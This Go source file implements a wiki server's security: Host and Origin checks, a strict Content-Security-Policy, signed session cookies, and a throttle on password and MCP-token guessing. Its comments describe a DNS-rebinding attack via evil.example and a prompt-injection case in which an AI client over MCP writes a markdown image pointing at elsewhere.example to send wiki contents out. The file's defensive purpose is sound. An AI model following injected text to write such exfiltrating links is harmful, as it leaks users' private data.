// How Zone protects the wiki (docs/spec/security.md): the Host and Origin
// checks, the login gate and its session cookie, the page policy, and the
// throttle on wrong passwords and MCP tokens.
package main

import (
	"context"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/subtle"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"math"
	"net"
	"net/http"
	"net/netip"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"
)

// now is the clock of the throttle and the session (a test sets it).
var now = time.Now

// DNS rebinding: a page on evil.example whose name later resolves to
// 127.0.0.1 reaches Zone with "Host: evil.example". Only localhost, and the
// names in the hosts setting (a reverse proxy's public name), get in, at
// any port (--addr). ZONE_ALLOW_REMOTE without hosts turns the check off
// (LAN access by IP).
var allowedHosts = map[string]bool{"localhost": true, "127.0.0.1": true, "[::1]": true}

func hostAllowed(host string) bool {
	hosts := settings().Hosts
	if cfg.AllowRemote && len(hosts) == 0 {
		return true
	}
	name := hostName(host)
	return allowedHosts[name] || hosts[name]
}

// Cross-site request forgery: without it, any page open in the browser could
// post a form to http://localhost:5000/delete/<page> (or /edit, or the tasks
// API, which takes text/plain bodies without a CORS preflight), and the Host
// check passes because the Host really is localhost. Browsers send Origin on
// every cross-site POST, so a write whose Origin names another site, or is
// "null" (a sandboxed iframe), is refused. Zone's own forms, fetches and the
// pagehide beacon are same-origin; tools like curl send no Origin.
func crossSite(r *http.Request) bool {
	switch r.Method {
	case "POST", "PUT", "PATCH", "DELETE":
	default:
		return false
	}
	origins, sent := r.Header["Origin"]
	if !sent {
		return false
	}
	origin := origins[0]
	if origin == "null" {
		return true
	}
	u, err := url.Parse(origin)
	return err != nil || u.Host != r.Host
}

// What a page may run and load. Pages render their raw HTML as written, and
// pages are also written by AI clients (MCP), which may have read a prompt
// injection: a <script>, an onerror= or a javascript: link in a page would
// run with the user's session and could read and rewrite the whole wiki. So
// only Zone's own script files run (script-src 'self'; Zone has no inline
// scripts or handlers), no plugins, no <base> that re-points those files, no
// form that posts elsewhere.
//
// And a page loads nothing from other hosts: an image, a frame, a
// stylesheet or a font there is a request the page's writer addresses, and
// so a way to send the wiki away without any script: an assistant told to
// (by text it read) writes ![](https://elsewhere.example/?what-it-read)
// and the reader's browser delivers it; a frame from elsewhere shows a
// sign-in form that isn't Zone's. So everything comes from Zone itself
// (default-src 'self'), images, media and fonts also from data: (pasted
// in), styles also inline (a page's own, KaTeX's, Mermaid's: they load
// nothing, as their url()s are images). The external-content setting names
// hosts images, media and frames may come from all the same ("*": any,
// as before). Links stay: following one is the reader's doing.
//
// Clickjacking: another site could load Zone invisibly in a frame and trick
// a signed-in user into clicking Delete or Commit, so only Zone's own pages
// may frame it (a page's raw HTML may show an upload in an <iframe>). A
// response with its own policy (an SVG upload's) keeps it and gets only
// frame-ancestors added.
func pageCSP(s *Settings) string {
	external := ""
	if len(s.External) > 0 {
		external = " " + strings.Join(s.External, " ")
	}
	return "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; " +
		"img-src 'self' data: blob:" + external + "; media-src 'self' data: blob:" + external + "; " +
		"frame-src 'self'" + external + "; font-src 'self' data:; connect-src 'self'; " +
		"object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self'"
}

// externalRE: a host of the external-content setting, as a policy's source:
// a name, with "*." for its subdomains, maybe a port; or "*", any host.
var externalRE = regexp.MustCompile(`^(\*|(\*\.)?[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)*(:\d+)?)$`)

// loadsFrom: a page may load from host (a URL's, maybe with a port), as
// the external-content setting says.
func (s *Settings) loadsFrom(host string) bool {
	if s == nil {
		return false
	}
	host = strings.ToLower(host)
	name := host
	if i := strings.LastIndex(host, ":"); i >= 0 && !strings.HasSuffix(host, "]") {
		name = host[:i]
	}
	for _, e := range s.External {
		switch sub, wild := strings.CutPrefix(e, "*."); {
		case e == "*", e == host, e == name:
			return true
		case wild && (strings.HasSuffix(host, "."+sub) || strings.HasSuffix(name, "."+sub)):
			return true
		}
	}
	return false
}

func contentPolicy(h http.Header) {
	csp := h.Get("Content-Security-Policy")
	if csp == "" {
		h.Set("Content-Security-Policy", pageCSP(settings()))
	} else if !strings.Contains(csp, "frame-ancestors") {
		h.Set("Content-Security-Policy", csp+"; frame-ancestors 'self'")
	}
	h.Set("X-Frame-Options", "SAMEORIGIN") // browsers without CSP
	// A JSON or text response is never run as a script (<script src=…>).
	h.Set("X-Content-Type-Options", "nosniff")
	// What a page does load from elsewhere (external-content) isn't told
	// which page asked.
	if h.Get("Referrer-Policy") == "" {
		h.Set("Referrer-Policy", "same-origin")
	}
	if strings.Contains(h.Get("Content-Type"), "text/html") {
		h.Set("Cache-Control", "no-store")
	}
}

// isHTTPS: the browser's connection is HTTPS, Zone's own (rare) or a
// reverse proxy's, which says so in X-Forwarded-Proto.
func isHTTPS(r *http.Request) bool {
	proto, _, _ := strings.Cut(r.Header.Get("X-Forwarded-Proto"), ",")
	return r.TLS != nil || strings.ToLower(strings.TrimSpace(proto)) == "https"
}

// secretKey signs session cookies: one Zone made once and keeps in
// .zone/secret_key in the wiki folder (owner-only, kept out of git), so a
// restart doesn't sign everyone out. A wiki folder Zone can't write to gets
// a new key per start.
func secretKey(dataDir string) []byte {
	path := filepath.Join(stateDirIn(dataDir), "secret_key")
	if b, err := os.ReadFile(path); err == nil {
		if k := strings.TrimSpace(string(b)); len(k) >= 32 {
			return []byte(k)
		}
	}
	raw := make([]byte, 32)
	_, _ = rand.Read(raw)
	key := []byte(hex.EncodeToString(raw))
	if os.Mkdir(filepath.Dir(path), 0o777) == nil || isDir(filepath.Dir(path)) {
		if err := os.WriteFile(path, key, 0o600); err != nil {
			logf("could not keep the session key in %s (%v): everyone signs in again after a restart", path, err)
		}
		_ = os.Chmod(path, 0o600) // WriteFile keeps an existing file's mode
	}
	return key
}

// The login session: a cookie signed with the secret key, valid for 30 days
// and renewed as it is used. It says who signed in: with users, their name;
// with the wiki's one password, no one in particular (""). It carries a
// stamp of the password it was signed in with (passwordStamp), so a new
// password ends every session of the old one, and an id that stays the same
// as it is renewed, so signing out ends it wherever a copy of the cookie is
// (signout.go).
const (
	sessionCookie   = "session"
	sessionLifetime = 30 * 24 * time.Hour
)

var sessionKey []byte

type session struct {
	Auth   bool   `json:"auth"`
	Issued int64  `json:"iat"`
	User   string `json:"user,omitempty"`
	Pw     string `json:"pw"`
	ID     string `json:"id,omitempty"`
}

// passwordStamp: what a session of user ("": the wiki's password) holds of
// the password: a MAC of its hash, which has a salt of its own, so even
// the same password set again makes a new one.
func passwordStamp(user string) string {
	s := settings()
	hash := s.PasswordHash
	if u := s.Users[user]; u != nil {
		hash = u.PasswordHash
	}
	return stampOf(hash)
}

func stampOf(hash string) string { return sign("password:" + hash)[:16] }

func sign(payload string) string {
	m := hmac.New(sha256.New, sessionKey)
	m.Write([]byte(payload))
	return base64.RawURLEncoding.EncodeToString(m.Sum(nil))
}

// readSession: the session of the request's cookie, if Zone signed it. A
// session without an id is none: it couldn't be signed out.
func readSession(r *http.Request) (s session, ok bool) {
	c, err := r.Cookie(sessionCookie)
	if err != nil {
		return s, false
	}
	payload, sig, found := strings.Cut(c.Value, ".")
	if !found || !hmac.Equal([]byte(sig), []byte(sign(payload))) {
		return s, false
	}
	raw, err := base64.RawURLEncoding.DecodeString(payload)
	if err != nil || json.Unmarshal(raw, &s) != nil || !s.Auth || s.ID == "" {
		return s, false
	}
	return s, true
}

// signedIn: the request carries a valid session cookie, user is who it
// belongs to; renew says it is old enough (a day) to be given a fresh one.
// With users, the session must name one of them, not disabled, so a user
// taken out of the settings or disabled is signed out at once; without, it must name no one, so
// switching between a password and users signs everyone out; a changed
// password signs out the sessions of the old one; and a session signed
// out is over, whoever holds a copy of its cookie.
func signedIn(r *http.Request) (user string, ok, renew bool) {
	s, ok := readSession(r)
	if !ok {
		return "", false, false
	}
	users := settings().Users
	if users != nil && (users[s.User] == nil || users[s.User].Disabled) || users == nil && s.User != "" ||
		!hmac.Equal([]byte(s.Pw), []byte(passwordStamp(s.User))) || isSignedOut(s.ID) {
		return "", false, false
	}
	age := now().Sub(time.Unix(s.Issued, 0))
	return s.User, age < sessionLifetime, age > 24*time.Hour
}

// The cookie is Secure (HTTPS only) when the request came over HTTPS, so
// behind an HTTPS proxy the browser never sends it in the clear; over plain
// http (localhost, the LAN) it still works. A client faking the header only
// gets a cookie its own http requests leave out.
func setSession(w http.ResponseWriter, r *http.Request, user string) {
	setSessionHash(w, r, user, "")
}

// setSessionHash: setSession with the password's hash given (a password
// set by a welcome link, whose settings take effect only once the request
// has ended); "": the user's hash as the settings have it.
func setSessionHash(w http.ResponseWriter, r *http.Request, user, hash string) {
	stamp := passwordStamp(user)
	if hash != "" {
		stamp = stampOf(hash)
	}
	writeSession(w, r, session{User: user, Pw: stamp, ID: newToken()[:16]})
}

// renewSession: the request's session with a new date, still the same one.
func renewSession(w http.ResponseWriter, r *http.Request) {
	if s, ok := readSession(r); ok {
		writeSession(w, r, s)
	}
}

func writeSession(w http.ResponseWriter, r *http.Request, s session) {
	s.Auth, s.Issued = true, now().Unix()
	raw, _ := json.Marshal(s)
	payload := base64.RawURLEncoding.EncodeToString(raw)
	http.SetCookie(w, &http.Cookie{
		Name: sessionCookie, Value: payload + "." + sign(payload), Path: "/",
		Expires: now().Add(sessionLifetime), HttpOnly: true, Secure: isHTTPS(r),
		SameSite: http.SameSiteLaxMode,
	})
}

// The user a request is made by (users.go): the checks put the session's
// user, /mcp its token's, into the request's context. "": no users, or
// none signed in.
type userKey struct{}

func withUser(r *http.Request, user string) *http.Request {
	if user == "" {
		return r
	}
	return r.WithContext(context.WithValue(r.Context(), userKey{}, user))
}

func userOf(r *http.Request) string {
	if r == nil {
		return ""
	}
	u, _ := r.Context().Value(userKey{}).(string)
	return u
}

func clearSession(w http.ResponseWriter, r *http.Request) {
	http.SetCookie(w, &http.Cookie{Name: sessionCookie, Value: "", Path: "/", MaxAge: -1,
		HttpOnly: true, Secure: isHTTPS(r), SameSite: http.SameSiteLaxMode})
}

// sameSecret compares in constant time, as bytes, so non-ASCII passwords work.
func sameSecret(given, secret string) bool {
	return subtle.ConstantTimeCompare([]byte(given), []byte(secret)) == 1
}

// clientKey is who is guessing, for the throttle: the client's address.
// Behind a reverse proxy every request comes from the proxy, so a trusted
// one (trusted-proxies in the settings file; unset: loopback) names the
// client in X-Forwarded-For: the last entry not itself a trusted proxy,
// which a proxy appended (entries before it are the client's to make up).
// Anyone else's X-Forwarded-For is ignored: a client on the LAN could
// otherwise send a new one with every guess and never be throttled.
// On a Unix socket (--addr unix:PATH) the peer is the proxy, whatever
// trusted-proxies says: it has no address for the setting to name, and only
// what is on this machine and may reach the socket connects. Without the
// header it counts as localhost.
func clientKey(r *http.Request) string { return network(clientAddr(r)) }

// network: an address as the throttle counts it: an IPv6 address by its
// /64, the network a client is given and may take any address of (each a
// client of its own otherwise, with five more tries); anything else as it is.
func network(key string) string {
	if addr, err := netip.ParseAddr(key); err == nil && addr.Is6() && !addr.Is4In6() {
		if p, err := addr.WithZone("").Prefix(64); err == nil {
			return p.String()
		}
	}
	return key
}

// clientAddr: the client's address (clientKey).
func clientAddr(r *http.Request) string {
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		host = r.RemoteAddr
	}
	if onSocket {
		host = "127.0.0.1"
	}
	header := r.Header.Get("X-Forwarded-For")
	peer, err := netip.ParseAddr(host)
	if err != nil || header == "" {
		return host
	}
	if !onSocket && !trustedProxy(peer) {
		untrustedForwarder(peer)
		return host
	}
	key := host
	parts := strings.Split(header, ",")
	for i := len(parts) - 1; i >= 0; i-- {
		a := strings.TrimSpace(parts[i])
		if a == "" {
			continue
		}
		key = a
		if addr, err := netip.ParseAddr(a); err != nil || !trustedProxy(addr) {
			break
		}
	}
	return key
}

// trustedProxy: addr is a proxy whose X-Forwarded-For counts.
func trustedProxy(addr netip.Addr) bool {
	addr = addr.Unmap()
	for _, p := range settings().TrustedProxies {
		if p.Contains(addr) {
			return true
		}
	}
	return false
}

// forwarders: the untrusted peers that sent X-Forwarded-For, said once each.
var forwarders = struct {
	sync.Mutex
	seen map[netip.Addr]bool
}{seen: map[netip.Addr]bool{}}

// untrustedForwarder: a peer not in trusted-proxies sent X-Forwarded-For;
// one on a private network is likely a reverse proxy left out, so the log
// says, once, how to trust it (its clients count as one meanwhile).
func untrustedForwarder(peer netip.Addr) {
	if !peer.IsPrivate() && !peer.IsLoopback() {
		return
	}
	forwarders.Lock()
	defer forwarders.Unlock()
	if forwarders.seen[peer] || len(forwarders.seen) > 100 {
		return
	}
	forwarders.seen[peer] = true
	logf("requests from %s carry X-Forwarded-For, which Zone ignores from it: if %s is your reverse proxy, "+
		"add it to trusted-proxies in %s (zonewiki config set trusted-proxies %s), so its clients are told apart "+
		"when wrong passwords are throttled", peer, peer, configName(), peer)
}

// Throttle slows a guesser of passwords (and MCP tokens) down: after free
// failures in a row from one client, each further try waits, 1 minute,
// then doubling up to an hour. A success clears the client; a client quiet
// for a day is forgotten. Per client, so a guesser elsewhere doesn't lock
// the owner out. In memory: a restart forgets.
//
// A try is checked through try, one at a time per client: tries sent at
// once would otherwise all be let in before the first of them counts as a
// failure (a hundred connections, a hundred guesses per wait).
type Throttle struct {
	free           int
	first, longest time.Duration
	mu             sync.Mutex
	fails          map[string]failures
	trying         map[string]*clientLock
	swept          time.Time // when the quiet clients were last forgotten
}

// clientLock: one client's tries, one at a time; n: how many hold or wait
// for it.
type clientLock struct {
	sync.Mutex
	n int
}

// try checks one try of key's with check (is the password right?): refused
// unchecked while key must wait (how long: wait), else counted as a
// failure or, right, clearing key. key's tries run one after another.
func (t *Throttle) try(key string, check func() bool) (ok bool, wait time.Duration) {
	t.mu.Lock()
	if t.trying == nil {
		t.trying = map[string]*clientLock{}
	}
	l := t.trying[key]
	if l == nil {
		l = &clientLock{}
		t.trying[key] = l
	}
	l.n++
	t.mu.Unlock()
	l.Lock()
	defer func() {
		l.Unlock()
		t.mu.Lock()
		if l.n--; l.n == 0 {
			delete(t.trying, key)
		}
		t.mu.Unlock()
	}()
	if wait := t.wait(key); wait > 0 {
		return false, wait
	}
	if check() {
		t.succeeded(key)
		return true, 0
	}
	t.failed(key)
	return false, 0
}

type failures struct {
	count int
	last  time.Time
}

func newThrottle() *Throttle {
	return &Throttle{free: 5, first: time.Minute, longest: time.Hour, fails: map[string]failures{}}
}

// wait is how long key must wait before it may try again (0: now).
func (t *Throttle) wait(key string) time.Duration {
	t.mu.Lock()
	f := t.fails[key]
	t.mu.Unlock()
	if f.count < t.free {
		return 0
	}
	delay := time.Duration(math.Min(float64(t.first)*math.Pow(2, float64(f.count-t.free)), float64(t.longest)))
	return max(0, f.last.Add(delay).Sub(now()))
}

func (t *Throttle) failed(key string) {
	n := now()
	t.mu.Lock()
	defer t.mu.Unlock()
	// Now and then, not at every failure: a guesser with many addresses
	// would make each one walk them all.
	if n.Sub(t.swept) >= time.Minute {
		t.swept = n
		for k, f := range t.fails {
			if n.Sub(f.last) >= 24*time.Hour {
				delete(t.fails, k)
			}
		}
	}
	t.fails[key] = failures{t.fails[key].count + 1, n}
}

func (t *Throttle) succeeded(key string) {
	t.mu.Lock()
	delete(t.fails, key)
	t.mu.Unlock()
}

var (
	loginThrottle = newThrottle()
	mcpThrottle   = newThrottle()
)

func waitMessage(d time.Duration) string {
	minutes := max(1, int(math.RoundToEven(d.Seconds()/60)))
	s := ""
	if minutes > 1 {
		s = "s"
	}
	return fmt.Sprintf("Too many wrong attempts. Try again in %d minute%s.", minutes, s)
}
